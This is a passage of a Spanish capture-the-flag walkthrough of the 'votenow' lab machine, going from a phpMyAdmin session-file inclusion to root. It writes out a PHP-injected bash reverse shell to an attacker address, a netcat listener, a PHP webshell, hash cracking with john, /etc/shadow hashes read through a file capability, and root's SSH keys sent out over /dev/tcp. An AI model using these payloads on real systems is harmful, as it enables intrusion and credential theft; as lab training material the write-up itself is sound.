��Z'�zC�";userconfig|a:2:{s:2:"db";a:1:{s:12:"Console/Mode";s:8:"collapse";}s:2:"ts";i:1675460312;}two_factor_check|b:1;tmpval|a:4:{s:13:"recent_tables";a:1:{i:1;a:0:{}}s:15:"favorite_tables";a:1:{i:1;a:0:{}}s:18:"table_limit_offset";i:0;s:21:"table_limit_offset_db";s:7:"votebox";}ConfigFile1|a:2:{s:7:"Console";a:1:{s:4:"Mode";s:8:"collapse";}s:7:"Servers";a:1:{i:1;a:2:{s:7:"only_db";s:0:"";s:7:"hide_db";s:0:"";}}}debug|a:0:{}prev_errors|a:2:{s:32:"bb41f23841f9ba0f9103b0754c581d2e";O:16:"PhpMyAdmin\Error":12:{s:7:"*file";s:11:"./index.php";s:7:"*line";i:61;s:12:"*backtrace";a:1:{i:0;a:3:{s:4:"file";s:11:"./index.php";s:4:"line";i:61;s:8:"function";s:7:"include";}}s:16:"*hide_location";b:0;s:9:"*number";i:2;s:9:"*string";s:0:"";s:10:"*message";s:180:"include(db_sql.php%3f../../../../../../../..//var/lib/php/session/sess_/var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5): failed to open stream: No such file or directory";s:14:"*isDisplayed";b:1;s:12:"*useBBCode";b:0;s:7:"*hash";s:32:"bb41f23841f9ba0f9103b0754c581d2e";s:9:"*params";a:0:{}s:16:"*addedMessages";a:0:{}}s:32:"a1caf3838ae18c595102062e210029d2";O:16:"PhpMyAdmin\Error":12:{s:7:"*file";s:11:"./index.php";s:7:"*line";i:61;s:12:"*backtrace";a:1:{i:0;a:3:{s:4:"file";s:11:"./index.php";s:4:"line";i:61;s:8:"function";s:7:"include";}}s:16:"*hide_location";b:0;s:9:"*number";i:2;s:9:"*string";s:0:"";s:10:"*message";s:213:"include(): Failed opening 'db_sql.php%3f../../../../../../../..//var/lib/php/session/sess_/var/lib/php/session/sess_htmu66othqmaf4dvv37hs3taajavmjb5' for inclusion (include_path='.:/usr/share/pear:/usr/share/php')";s:14:"*isDisplayed";b:1;s:12:"*useBBCode";b:0;s:7:"*hash";s:32:"a1caf3838ae18c595102062e210029d2";s:9:"*params";a:0:{}s:16:"*addedMessages";a:0:{}}}errors|a:0:{}
```

Como se puede ver, las operaciones previas que hemos realizado se ven reflejadas en el fichero.

Una cosa que podemos hacer, es, dentro phpMyAdmin, en el formulario donde se pueden realizar queries de SQL a modo de prueba, escribir:

```sql
select '<?php phpinfo();exit;?>'
```

Si ahora miramos el fichero de sesión, vemos que aparece la info de phpmy admin allí!

![phpinfo.png](phpinfo.png)

Eso significa que si en vez de esa instrucción de php, inyectamos otro payload, podríamos usar ese mecanismo para entrar al sistema mediante una reverse shell.

Cerramos y abrimos la sesión para renovar la cookie, y añadimos la siguiente query:


```sql
SELECT '<?PHP system(urldecode("bash%20-c%20%22/bin/bash%20-i%20%26%3e%20/dev/tcp/192.168.1.80/443%200%3e%261%22")); ?>'
```

Como la linea de la reverse shell está completamente urlencodeada, no será entendida a menos que la decodifiquemos con urldecode.

![cookie_payload.png](cookie_payload.png)

Nos ponemos en escucha por el puerto 443 con:

```bash
> nc -nlvp 443
```

Con la cookie de sesión y el payload inyectado en los logs de sesión de php entramos la siguiente URL:

http://datasafe.votenow.local/index.php?target=db_sql.php%253f../../../../../../../../var/lib/php/session/sess_tn6qlv1hli0dse8nnsf866f8gkemo9j6

y nos da acceso a la máquina! Tras el tratamiento de consola esto es lo que vemos:

```bash
Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
bash-4.2$ export TERM=xterm
bash-4.2$ hostname -i
192.168.1.142
bash-4.2$ whoami
apache
bash-4.2$ 
```

Como podemos ver estamos en la máquina víctima y somos el usuario apache.

Para simplificar el acceso futuro a la máquina nos hacemos una webshell con php:

```php
<?php system($_GET['cmd']); ?>
```

y guardamos como cmd.php
Para entablar la shell simplemente añadimos como parámetro a la url la misma linea de antes urlencodeada.

http://datasafe.votenow.local/cmd.php?cmd=bash%20-c%20%22/bin/bash%20-i%20%26%3e%20/dev/tcp/192.168.1.80/443%200%3e%261%22

-------------------------------------------------------------------------------

vamos al directorio home y vemos que solo hay un directorio: admin

```bash
bash-4.2$ cd /home
bash-4.2$ ls -la
total 0
drwxr-xr-x.  3 root  root   19 Jun 27  2020 .
dr-xr-xr-x. 17 root  root  244 Jun 27  2020 ..
drwx------.  2 admin admin 116 Jun 28  2020 admin
bash-4.2$ cd admin
bash: cd: admin: Permission denied
bash-4.2$ 
```

-------------------------------------------------------------------------------

Miramos qué podemos ejecutar como usuarios privilegiados, pero el comando *su* requiere contraseña para el usuario apache.
También miramos qué ficheros se ejecutarán con privilegios elevados con find / -perm /4000, y posibles archivos con capabilities.

```bash
> getcap -r / 2>/dev/null
```

```bash
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/tarS = cap_dac_read_search+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
bash-4.2$ 
```

Tras mucho mirar vemos que no hay nada con lo que podamos subir de apache a admin o root.

-------------------------------------------------------------------------------

Si recordamos, en la base de datos habíamos conseguido acceder a los datos de un usuario que era admin y un hash.

Por fuerza bruta podemos averiguar si ese hash es algún password de los que figuran en Rockyou.

```bash
> john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![johntheripper.png](johntheripper.png)

-------------------------------------------------------------------------------

Y vemos que hay una coincidencia Stella. Probamos a cambiar de usuario a admin.

```bash
> su admin
password: Stella
```

Y bingo! escalamos privilegios a admin.

-------------------------------------------------------------------------------

Veamos qué hay en el directorio home de admin:

```bash
[admin@votenow ~]$ ls -la
total 20
drwx------. 2 admin admin 116 Jun 28  2020 .
drwxr-xr-x. 3 root  root   19 Jun 27  2020 ..
lrwxrwxrwx. 1 root  root    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r--. 1 admin admin  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 admin admin 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 admin admin 231 Apr  1  2020 .bashrc
-rw-r--r--  1 admin admin  75 Jun 27  2020 notes.txt
-rwx------  1 admin admin  33 Jun 27  2020 user.txt
```

Y vemos que hemos obtenido la flag de usuario.

```bash
[admin@votenow ~]$ cat user.txt 
663ba6a402a57536772c6118e8181570
```

-------------------------------------------------------------------------------

Miramos el fichero notes.txt a ver qué muestra:

```bash
[admin@votenow ~]$ cat notes.txt 
```

```bash
Reminders:
1) Utilise new commands to backup and compress sensitive files
```

-------------------------------------------------------------------------------

Viendo la nota, podemos recordar que enumerando las capabilities había un fichero llamado
tarS.

```bash
/usr/bin/tarS = cap_dac_read_search+ep
```

Si hacemos ls -la de dicho fichero vemos lo siguiente:

```bash
> [admin@votenow ~]$ ls -la /usr/bin/tarS
```

```bash
-rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin//tarS
```

Es decir, el usuario admin es el único que puede ejecutar dicho fichero.

Miramos en google de qué trata esta capability cap_dac_read_search:

https://man7.org/linux/man-pages/man7/capabilities.7.html

```
	CAP_DAC_READ_SEARCH
	       * Bypass file read permission checks and directory read
	         and execute permission checks;
	       * invoke open_by_handle_at(2);
	       * use the linkat(2) AT_EMPTY_PATH flag to create a link to
	         a file referred to by a file descriptor.
```

-------------------------------------------------------------------------------

Como podemos ver, esta capability permite saltarse los permisos de lectura de ficheros y diretorio
por ese motivo podemos probar varias cosas, como leer del directorio root, o del fichero /etc/shadow

```bash
> tarS -A /etc/shadow -f pepe.tar
```

hacemos cat pepe.tar

```bash
root:$6$BvtXLMHn$zoYCSCRbdnaUOb4u3su6of9DDUXeUEe05OOiPIQ5AWo6AB3FWRr/RC3PQ4z.ryqn6o5xS9g4JTKHYI4ek9y541:18440:0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
systemd-network:!!:18440::::::
dbus:!!:18440::::::
polkitd:!!:18440::::::
sshd:!!:18440::::::
postfix:!!:18440::::::
chrony:!!:18440::::::
apache:!!:18440::::::
admin:$6$QeT4IOER$tHg/DAvc5NegomFKFryL5Xe7Od05z7CkYYs9sdRQaQVnJYvsXm2tQljaUhgXVMG8jXaChhhmny6MhD2K5jFXF/:18440:0:99999:7:::
mysql:!!:18440::::::
```

Con esta información podemos intentar crackear el hash de root. Pero como es un proceso largo y costoso, vamos a ver si podemos avanzar en otra dirección.

-------------------------------------------------------------------------------

También podemos obtener todos los archivos del directorio de root.

```bash
tarS -r /root -f pepa.tar
```

y metemos todo el contenido del directorio de root en dicho fichero.
Luego para listar el contenido de dicho fichero:

```bash
> tarS -tvf pepa.tar | grep -v ".cache"
```

```bash
dr-xr-x--- root/root         0 2020-06-28 00:37 root/
-rw-r--r-- root/root        18 2013-12-29 02:26 root/.bash_logout
-rw-r--r-- root/root       176 2013-12-29 02:26 root/.bash_profile
-rw-r--r-- root/root       176 2013-12-29 02:26 root/.bashrc
-rw-r--r-- root/root       100 2013-12-29 02:26 root/.cshrc
-rw-r--r-- root/root       129 2013-12-29 02:26 root/.tcshrc
-rw------- root/root      1262 2020-06-27 21:43 root/anaconda-ks.cfg
drwxr----- root/root         0 2020-06-27 22:55 root/.pki/
drwxr----- root/root         0 2020-06-27 22:55 root/.pki/nssdb/
lrwxrwxrwx root/root         0 2020-06-27 22:58 root/.bash_history -> /dev/null
lrwxrwxrwx root/root         0 2020-06-27 22:58 root/.mysql_history -> /dev/null
drwxr-xr-x root/root         0 2020-06-27 23:20 root/.config/
drwxr-xr-x root/root         0 2020-06-27 23:14 root/.config/composer/
-rw-r--r-- root/root        13 2020-06-27 23:14 root/.config/composer/.htaccess
drwx------ root/root         0 2020-06-27 23:20 root/.config/htop/
drwxr-xr-x root/root         0 2020-06-27 23:14 root/.local/
drwxr-xr-x root/root         0 2020-06-27 23:14 root/.local/share/
drwxr-xr-x root/root         0 2020-06-27 23:14 root/.local/share/composer/
-rw-r--r-- root/root        13 2020-06-27 23:14 root/.local/share/composer/.htaccess
-rwx------ root/root       278 2020-06-28 00:03 root/root-final-flag.txt
drwx------ root/root         0 2020-06-28 00:35 root/.ssh/
-rw------- root/root      3243 2020-06-28 00:35 root/.ssh/id_rsa
-rw-r--r-- root/root       744 2020-06-28 00:35 root/.ssh/id_rsa.pub
-rw-r--r-- root/root       744 2020-06-28 00:35 root/.ssh/authorized_keys
-rw------- root/root      5210 2020-06-28 00:37 root/.viminfo
```

como podemos ver tenemos la claves ssh de root!

-------------------------------------------------------------------------------

Extraemos las claves tanto pública como privada y nos la enviamos a nuestra máquina:

```bash
> tar -xvf pepa.tar root/.ssh/id_rsa.pub
```

```bash
> ls -la /tmp/root/.ssh
-rw------- 1 admin admin 3243 Jun 28  2020 id_rsa
-rw-r--r-- 1 admin admin  744 Jun 28  2020 id_rsa.pub
[admin@votenow .ssh]$ cat id_rsa > /dev/tcp/192.168.1.80/443
[admin@votenow .ssh]$ cat id_rsa.pub > /dev/tcp/192.168.1.80/443
```

en nuestra máquina previamente habíamos creado un listener con:

```bash
> nc -lvnp 443 > id_rsa
y
> nc -lvnp 443 > id_rsa.pub
```

-------------------------------------------------------------------------------

Con estos ficheros, hacemos ssh a la máquina víctima:

```bash
> ssh -p 2082 root@192.168.1.142 -i id_rsa
```

```bash
Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1

[root@votenow ~]# pwd                                                                            
/root

[root@votenow ~]# ls -la
total 36
dr-xr-x---.  7 root root  267 jun 28  2020 .
dr-xr-xr-x. 17 root root  244 jun 27  2020 ..
-rw-------.  1 root root 1262 jun 27  2020 anaconda-ks.cfg
lrwxrwxrwx.  1 root root    9 jun 27  2020 .bash_history -> /dev/null
-rw-r--r--.  1 root root   18 dic 29  2013 .bash_logout
-rw-r--r--.  1 root root  176 dic 29  2013 .bash_profile
-rw-r--r--.  1 root root  176 dic 29  2013 .bashrc
drwxr-xr-x.  3 root root   22 jun 27  2020 .cache
drwxr-xr-x.  4 root root   34 jun 27  2020 .config
-rw-r--r--.  1 root root  100 dic 29  2013 .cshrc
drwxr-xr-x.  3 root root   19 jun 27  2020 .local
lrwxrwxrwx.  1 root root    9 jun 27  2020 .mysql_history -> /dev/null
drwxr-----.  3 root root   19 jun 27  2020 .pki
-rwx------   1 root root  278 jun 28  2020 root-final-flag.txt
drwx------   2 root root   61 jun 28  2020 .ssh
-rw-r--r--.  1 root root  129 dic 29  2013 .tcshrc
-rw-------   1 root root 5210 jun 28  2020 .viminfo
```

-------------------------------------------------------------------------------

Y vemos que ahí tenemos la flag:

```bash
[root@votenow ~]# cat root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.
```
